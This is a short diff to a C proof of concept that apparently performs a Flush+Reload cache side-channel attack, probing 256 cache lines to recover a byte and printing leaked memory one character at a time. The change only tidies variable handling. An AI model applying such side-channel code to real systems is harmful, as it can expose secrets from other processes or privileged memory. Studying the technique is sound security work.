@@ -133,8 +133,7 @@ while(retries--){
     for(i = 0 ; i < 256 ; i++){
       if(Flush_Reload(mem + i*4096)){
         if(i>=1){
-          val = i;
-          return val;
+          return i;
         }
       }
     }
@@ -179,13 +178,13 @@ __attribute__((visibility("default"))) int main() {
   }
 
 
-    size_t address = 0x0;
+    size_t address = TestString;
 
   while (1) {
-    int value = Read(TestString);
+    int value = Read(address);
     printf("%c", value);
     fflush(stdout);
-    TestString++;
+  address++;
   }
   free(_mem);
 
